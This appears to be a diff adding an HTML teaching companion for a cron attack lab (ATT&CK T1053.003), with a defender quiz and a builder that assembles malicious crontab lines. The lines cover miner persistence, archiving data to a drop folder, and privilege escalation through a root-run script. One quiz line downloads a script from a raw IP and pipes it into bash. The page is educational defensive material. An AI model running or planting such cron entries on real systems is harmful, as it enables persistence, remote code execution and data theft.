@@ -1,0 +1,252 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Cron Attack Lab</title>
+<style>
+  :root {
+    --bg: #f4f6fb; --panel: #ffffff; --ink: #1b2130; --muted: #5a6478;
+    --line: #dde3ee; --accent: #2f6df6; --accent-ink: #ffffff;
+    --good: #138a52; --good-bg: #e6f6ed; --bad: #c0362c; --bad-bg: #fbe9e7;
+    --code-bg: #0f1424; --code-ink: #e7ecf5; --chip: #eef2fb;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --bg: #0d1017; --panel: #161b26; --ink: #e7ecf5; --muted: #9aa6bd;
+      --line: #28303f; --accent: #5b8bff; --accent-ink: #0d1017;
+      --good: #4ad08a; --good-bg: #122a1f; --bad: #ff7a6e; --bad-bg: #2c1512;
+      --code-bg: #05070d; --code-ink: #e7ecf5; --chip: #1c2433;
+    }
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0; background: var(--bg); color: var(--ink);
+    font: 16px/1.55 system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
+  }
+  .wrap { max-width: 860px; margin: 0 auto; padding: 24px 16px 80px; }
+  header h1 { margin: 0 0 4px; font-size: 1.7rem; }
+  header p { margin: 0; color: var(--muted); }
+  .note {
+    margin: 18px 0; padding: 12px 14px; border: 1px dashed var(--line);
+    border-radius: 10px; background: var(--chip); color: var(--muted); font-size: .92rem;
+  }
+  section {
+    background: var(--panel); border: 1px solid var(--line); border-radius: 14px;
+    padding: 20px; margin: 22px 0;
+  }
+  h2 { margin: 0 0 4px; font-size: 1.25rem; }
+  .sub { margin: 0 0 16px; color: var(--muted); font-size: .95rem; }
+  code, .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+  .btn {
+    display: inline-block; border: 1px solid var(--line); background: var(--chip);
+    color: var(--ink); border-radius: 9px; padding: 8px 12px; margin: 4px 6px 4px 0;
+    cursor: pointer; font-size: .9rem; transition: .15s;
+  }
+  .btn:hover { border-color: var(--accent); }
+  .btn.active { background: var(--accent); color: var(--accent-ink); border-color: var(--accent); }
+  .out {
+    margin-top: 14px; padding: 14px; border-radius: 10px; background: var(--chip);
+    border: 1px solid var(--line); min-height: 20px;
+  }
+  .cronline {
+    font-family: ui-monospace, monospace; background: var(--code-bg); color: var(--code-ink);
+    padding: 12px 14px; border-radius: 8px; overflow-x: auto; white-space: pre; font-size: .95rem;
+  }
+  .fields { display: flex; gap: 10px; flex-wrap: wrap; margin: 14px 0; }
+  .field label { display: block; font-size: .78rem; color: var(--muted); margin-bottom: 4px; }
+  select {
+    font: inherit; padding: 8px 10px; border-radius: 8px; border: 1px solid var(--line);
+    background: var(--panel); color: var(--ink); min-width: 190px;
+  }
+  .tag { display: inline-block; font-size: .72rem; font-weight: 700; padding: 2px 8px;
+    border-radius: 999px; background: var(--bad-bg); color: var(--bad); margin-left: 8px; }
+  .tag.ok { background: var(--good-bg); color: var(--good); }
+  .quiz-line {
+    font-family: ui-monospace, monospace; display: block; padding: 8px 10px; margin: 6px 0;
+    border-radius: 8px; border: 1px solid var(--line); cursor: pointer; background: var(--code-bg);
+    color: var(--code-ink); font-size: .88rem; transition: .12s;
+  }
+  .quiz-line:hover { outline: 2px solid var(--accent); }
+  .quiz-line.right { border-color: var(--good); background: var(--good-bg); color: var(--good); }
+  .quiz-line.wrong { border-color: var(--bad); background: var(--bad-bg); color: var(--bad); }
+  .feedback { margin-top: 10px; font-size: .92rem; }
+  .legend { font-size: .82rem; color: var(--muted); margin-top: 10px; }
+  table.ref { width: 100%; border-collapse: collapse; margin-top: 8px; font-size: .9rem; }
+  table.ref td { border: 1px solid var(--line); padding: 7px 9px; vertical-align: top; }
+  table.ref td:first-child { font-family: ui-monospace, monospace; white-space: nowrap; color: var(--accent); }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header>
+    <h1>Cron Attack Lab &mdash; Interactive Companion</h1>
+    <p>Scheduled Task/Job: Cron &middot; ATT&amp;CK T1053.003</p>
+  </header>
+
+  <!-- ============================================================= -->
+  <!-- WRITE YOUR OWN: a 2-3 sentence welcome in your own voice.      -->
+  <!-- What this page is, and how it pairs with the terminal lab.     -->
+  <!-- Delete this note box once you've written your intro.           -->
+  <!-- ============================================================= -->
+  <div class="note">[Your intro text here &mdash; e.g. "Use this page alongside the terminal.
+    Play with the three tools below to see how cron works, how attackers abuse it, and how
+    defenders catch it."]</div>
+
+  <!-- ZONE 1 ------------------------------------------------------- -->
+  <section>
+    <h2>1. What is a cron job?</h2>
+    <p class="sub">Cron runs commands on a schedule. Click a everyday example to see
+      what its schedule means and what it does. These are all normal, harmless jobs.</p>
+    <div id="defaults"></div>
+    <div class="out" id="defaultOut">Pick an example above.</div>
+    <div class="legend">A cron line has 5 time fields then a command:
+      <span class="mono">minute&nbsp; hour&nbsp; day-of-month&nbsp; month&nbsp; day-of-week&nbsp; &lt;command&gt;</span>.
+      A <span class="mono">*</span> means &ldquo;every&rdquo;.</div>
+  </section>
+
+  <!-- ZONE 2 ------------------------------------------------------- -->
+  <section>
+    <h2>2. Build an abuse entry</h2>
+    <p class="sub">Now see the other side. Pick a schedule and a payload an attacker might
+      choose, and watch the malicious crontab line assemble itself. Nothing here runs &mdash;
+      it only shows what such a line <em>would</em> do.</p>
+    <div class="fields">
+      <div class="field">
+        <label for="sched">Schedule (when it runs)</label>
+        <select id="sched"></select>
+      </div>
+      <div class="field">
+        <label for="payload">Payload (what it does)</label>
+        <select id="payload"></select>
+      </div>
+    </div>
+    <div class="cronline" id="builtLine"></div>
+    <div class="out" id="buildOut"></div>
+  </section>
+
+  <!-- ZONE 3 ------------------------------------------------------- -->
+  <section>
+    <h2>3. Spot the malicious entry <span class="sub" style="display:inline">(defender view)</span></h2>
+    <p class="sub">Here is a real-looking <span class="mono">crontab -l</span> dump from a server.
+      Most lines are normal admin jobs. Click the one(s) that look malicious.</p>
+    <div id="quiz"></div>
+    <div class="feedback" id="quizFeedback"></div>
+  </section>
+
+  <!-- REFERENCE ---------------------------------------------------- -->
+  <section>
+    <h2>Cron syntax quick reference</h2>
+    <table class="ref">
+      <tr><td>* * * * *</td><td>Every minute.</td></tr>
+      <tr><td>0 * * * *</td><td>At the top of every hour.</td></tr>
+      <tr><td>0 2 * * *</td><td>Every day at 02:00.</td></tr>
+      <tr><td>*/5 * * * *</td><td>Every 5 minutes.</td></tr>
+      <tr><td>@reboot</td><td>Once, each time the system starts.</td></tr>
+    </table>
+  </section>
+</div>
+
+<script>
+// ---- ZONE 1: legitimate examples -------------------------------------
+const defaults = [
+  { label: "Nightly backup", line: "0 2 * * * /usr/bin/backup.sh",
+    when: "Every day at 2:00 AM.",
+    what: "Runs a backup script while everyone is asleep so it doesn't slow the system during the day." },
+  { label: "Log rotation", line: "0 0 * * 0 /usr/sbin/logrotate /etc/logrotate.conf",
+    when: "Every Sunday at midnight (day-of-week 0 = Sunday).",
+    what: "Compresses and trims old log files so the disk doesn't fill up." },
+  { label: "Update check", line: "*/30 * * * * /usr/bin/apt update",
+    when: "Every 30 minutes.",
+    what: "Refreshes the list of available software updates." },
+  { label: "Clear temp files", line: "0 4 * * * find /tmp -type f -mtime +7 -delete",
+    when: "Every day at 4:00 AM.",
+    what: "Deletes files in /tmp that are more than 7 days old." },
+];
+const dWrap = document.getElementById('defaults');
+const dOut = document.getElementById('defaultOut');
+defaults.forEach((d, i) => {
+  const b = document.createElement('button');
+  b.className = 'btn'; b.textContent = d.label;
+  b.onclick = () => {
+    document.querySelectorAll('#defaults .btn').forEach(x => x.classList.remove('active'));
+    b.classList.add('active');
+    dOut.innerHTML = `<div class="cronline">${d.line}</div>
+      <p><strong>When:</strong> ${d.when}</p>
+      <p><strong>What it does:</strong> ${d.what}</p>`;
+  };
+  dWrap.appendChild(b);
+});
+
+// ---- ZONE 2: abuse builder -------------------------------------------
+const schedules = [
+  { v: "* * * * *", t: "Every minute (aggressive persistence)" },
+  { v: "@reboot",   t: "Every time the machine boots" },
+  { v: "0 3 * * *", t: "Daily at 3 AM (quiet, hard to notice)" },
+];
+const payloads = [
+  { id: "persist", t: "Re-launch a deleted miner (persistence)",
+    cmd: "/opt/lab/payloads/restore_miner.sh",
+    scenario: "Persistence", tactic: "TA0003",
+    why: "If a defender kills the malware, this job puts it right back. Deleting the payload is not enough &mdash; you must find and remove the cron job itself." },
+  { id: "exfil", t: "Copy sensitive files to a drop folder (exfiltration)",
+    cmd: "tar -czf /opt/drop/dump-$(date +\\%s).tar.gz /home/student/company_data",
+    scenario: "Exfiltration", tactic: "TA0010",
+    why: "Automated, repeating theft. Each run packages confidential data and leaves it where the attacker can collect it &mdash; no need to stay logged in." },
+  { id: "privesc", t: "Append a command to a root-run script (privilege escalation)",
+    cmd: "echo 'cp /root/secret.txt /home/student/loot.txt' >> /usr/local/bin/system_health.sh",
+    scenario: "Privilege Escalation", tactic: "TA0004",
+    why: "A low-privilege user edits a world-writable script that ROOT's cron runs. A minute later, root does the attacker's bidding &mdash; here, handing over a file the user could never read." },
+];
+const sSel = document.getElementById('sched');
+const pSel = document.getElementById('payload');
+schedules.forEach(s => sSel.add(new Option(s.t, s.v)));
+payloads.forEach(p => pSel.add(new Option(p.t, p.id)));
+function rebuild() {
+  const sv = sSel.value;
+  const p = payloads.find(x => x.id === pSel.value);
+  document.getElementById('builtLine').textContent = `${sv} ${p.cmd}`;
+  document.getElementById('buildOut').innerHTML =
+    `<p><strong>Scenario:</strong> ${p.scenario}
+       <span class="tag">ATT&amp;CK ${p.tactic}</span></p>
+     <p>${p.why}</p>`;
+}
+sSel.onchange = rebuild; pSel.onchange = rebuild; rebuild();
+
+// ---- ZONE 3: spot the malicious entry --------------------------------
+const quizLines = [
+  { line: "0 2 * * * /usr/bin/backup.sh", bad: false,
+    note: "Normal: a nightly backup owned by the admin." },
+  { line: "*/30 * * * * /usr/bin/apt update", bad: false,
+    note: "Normal: routine update check." },
+  { line: "* * * * * curl -s http://185.3.2.9/x.sh | bash", bad: true,
+    note: "MALICIOUS: downloads a script from a raw IP and pipes it straight into bash, every minute. Classic persistence + remote control." },
+  { line: "@reboot /tmp/.hidden/run 2>/dev/null", bad: true,
+    note: "MALICIOUS: runs a HIDDEN file from /tmp on every boot and silences errors. Legit software is not installed in /tmp as a dotfile." },
+  { line: "0 0 * * 0 /usr/sbin/logrotate /etc/logrotate.conf", bad: false,
+    note: "Normal: weekly log rotation." },
+];
+const qWrap = document.getElementById('quiz');
+const qFb = document.getElementById('quizFeedback');
+let found = 0;
+const totalBad = quizLines.filter(l => l.bad).length;
+quizLines.forEach(l => {
+  const el = document.createElement('span');
+  el.className = 'quiz-line'; el.textContent = l.line;
+  el.onclick = () => {
+    if (el.dataset.done) return;
+    el.dataset.done = "1";
+    if (l.bad) { el.classList.add('right'); found++; }
+    else { el.classList.add('wrong'); }
+    qFb.innerHTML += `<p>${l.bad ? '&#9989;' : '&#10060;'} <span class="mono">${l.line}</span> &mdash; ${l.note}</p>`;
+    if (found === totalBad) {
+      qFb.innerHTML += `<p><strong>Nice &mdash; you found all ${totalBad} malicious jobs.</strong>
+        The tells: raw IP addresses, piping downloads into a shell, hidden/odd paths like
+        <span class="mono">/tmp</span>, and silenced errors.</p>`;
+    }
+  };
+  qWrap.appendChild(el);
+});
+</script>
+</body>
+</html>
